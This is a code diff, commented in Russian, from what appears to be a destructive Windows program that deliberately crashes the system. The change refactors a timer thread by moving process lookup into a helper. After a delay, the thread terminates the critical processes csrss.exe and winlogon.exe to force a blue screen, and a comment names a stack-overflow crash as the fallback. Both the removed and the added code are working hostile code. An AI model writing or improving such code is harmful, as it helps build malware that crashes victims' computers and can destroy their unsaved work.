@@ -1012,45 +1012,47 @@ __declspec(noinline) VOID StackOverflowCrash() {
 
 // ==================== ПОТОК ДЛЯ BSOD ПО ТАЙМЕРУ ====================
 
-DWORD WINAPI TimerThread(LPVOID lpParam) {
-    Sleep(TOTAL_EFFECTS_TIME);
-    
-    // ====== СПОСОБ 1: УБИВАЕМ CSRSS.EXE ======
+// ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ: получаем PID процесса по имени
+DWORD GetProcessIdByName(const char* name) {
+    DWORD pid = 0;
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot != INVALID_HANDLE_VALUE) {
-        PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
+        PROCESSENTRY32 pe;
+        pe.dwSize = sizeof(PROCESSENTRY32);
         if (Process32First(hSnapshot, &pe)) {
             do {
-                if (_stricmp(pe.szExeFile, "csrss.exe") == 0) {
-                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
-                    if (hProcess) {
-                        TerminateProcess(hProcess, 0);
-                        CloseHandle(hProcess);
-                    }
+                if (_stricmp(pe.szExeFile, name) == 0) {
+                    pid = pe.th32ProcessID;
                     break;
                 }
             } while (Process32Next(hSnapshot, &pe));
         }
         CloseHandle(hSnapshot);
     }
+    return pid;
+}
+
+DWORD WINAPI TimerThread(LPVOID lpParam) {
+    Sleep(TOTAL_EFFECTS_TIME);
     
-    // ====== СПОСОБ 2: ЕСЛИ НЕ СРАБОТАЛО — УБИВАЕМ WINLOGON.EXE ======
-    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot != INVALID_HANDLE_VALUE) {
-        PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
-        if (Process32First(hSnapshot, &pe)) {
-            do {
-                if (_stricmp(pe.szExeFile, "winlogon.exe") == 0) {
-                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
-                    if (hProcess) {
-                        TerminateProcess(hProcess, 0);
-                        CloseHandle(hProcess);
-                    }
-                    break;
-                }
-            } while (Process32Next(hSnapshot, &pe));
+    // ====== СПОСОБ 1: УБИВАЕМ CSRSS.EXE ======
+    DWORD pid = GetProcessIdByName("csrss.exe");
+    if (pid) {
+        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+        if (hProcess) {
+            TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
         }
-        CloseHandle(hSnapshot);
+    }
+    
+    // ====== СПОСОБ 2: УБИВАЕМ WINLOGON.EXE ======
+    pid = GetProcessIdByName("winlogon.exe");
+    if (pid) {
+        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+        if (hProcess) {
+            TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+        }
     }
     
     // ====== СПОСОБ 3: STACK OVERFLOW (ДОБИВАЕТ ВСЕГДА) ======
